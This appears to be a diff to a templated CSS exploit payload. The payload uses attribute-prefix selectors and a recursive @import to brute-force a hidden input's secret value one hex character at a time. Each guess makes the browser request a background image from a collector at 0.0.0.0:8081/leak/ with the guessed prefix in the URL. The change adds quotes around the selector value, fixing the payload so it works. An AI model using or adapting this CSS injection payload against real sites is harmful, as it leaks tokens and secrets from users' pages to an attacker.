@@ -1,7 +1,7 @@
 @import "http://0.0.0.0:8081/css/{{ index+1 }}.css";
 
 {% for try_secret in "0123456789abcdef" %}
-input[value^={{ known_secret + try_secret }}]{{ ":first-child" * index }}{
+input[value^="{{ known_secret + try_secret }}"]{{ ":first-child" * index }}{
     background: url("http://0.0.0.0:8081/leak/{{ known_secret + try_secret }}");
 }
 {% endfor %}
